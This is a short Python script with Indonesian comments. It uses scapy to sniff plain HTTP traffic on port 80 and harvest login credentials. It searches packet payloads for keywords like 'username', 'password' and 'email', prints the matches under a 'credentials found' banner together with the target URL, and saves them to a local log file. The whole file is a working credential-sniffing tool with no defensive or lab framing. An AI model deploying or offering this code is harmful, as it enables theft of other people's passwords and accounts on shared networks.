import scapy.all as scapy
from scapy.layers import http
from colorama import init, Fore, Style
import datetime

init(autoreset=True)
URL_TERAKHIR = "Menunggu URL..."

def dapatkan_url(paket):
    """Mengekstrak URL dari paket HTTP Request."""
    try:
        host = paket[http.HTTPRequest].Host.decode()
        path = paket[http.HTTPRequest].Path.decode()
        return host + path
    except Exception:
        return None

def dapatkan_info_login(paket):
    """Mencari username/password di Raw Data."""
    if paket.haslayer(scapy.Raw):
        try:
            data_mentah = paket[scapy.Raw].load.decode(errors="ignore")
            
            kata_kunci = ["username", "user", "login", "password", "pass", "email", "uname", "sandi"]
            
            for kata in kata_kunci:
                if (kata + "=") in data_mentah:
                    return data_mentah
                    
        except Exception:
            pass
    return None

def catat_log(url, data):
    """Menyimpan hasil ke file."""
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    url_bersih = url if url else "URL Tidak Terdeteksi (Paket Terpecah)"
    
    log_entry = f"[{waktu}] URL: {url_bersih} | DATA: {data}\n"
    with open("hasil_tangkapan.txt", "a") as f:
        f.write(log_entry)
    print(Fore.YELLOW + f"[Disk] Data disimpan ke 'hasil_tangkapan.txt'")

def proses_paket(paket):
    global URL_TERAKHIR 

    if paket.haslayer(http.HTTPRequest):
        url_baru = dapatkan_url(paket)
        if url_baru:
            URL_TERAKHIR = url_baru

    if paket.haslayer(scapy.Raw) and paket.haslayer(scapy.TCP):
        info_login = dapatkan_info_login(paket)
        
        if info_login:
            print(Fore.RED + Style.BRIGHT + "\n" + "="*60)
            print(Fore.RED + Style.BRIGHT + "[*] BAHAYA: KREDENSIAL DITEMUKAN!")
            
            print(Fore.YELLOW + f"    Target URL : {URL_TERAKHIR}") 
            print(Fore.GREEN +  f"    Data Bocor : {info_login}")
            print(Fore.RED + Style.BRIGHT + "="*60 + "\n")
            
            catat_log(URL_TERAKHIR, info_login)

def mulai_mengintai(interface):
    print(Fore.CYAN + f"[*] Menjalankan 'Jaring Pengintai' pada interface: {interface}")
    print(Fore.CYAN + "[*] Menunggu input login dari Browser...")
    scapy.sniff(iface=interface, store=False, prn=proses_paket, filter="tcp port 80")

if __name__ == "__main__":
    # GANTI 'en0' SESUAI INTERFACE ANDA
    interface_wifi = "en0" 
    
    try:
        mulai_mengintai(interface_wifi)
    except KeyboardInterrupt:
        print("\n[!] Program berhenti.")
    except PermissionError:
        print(Fore.RED + "[!] Butuh sudo.")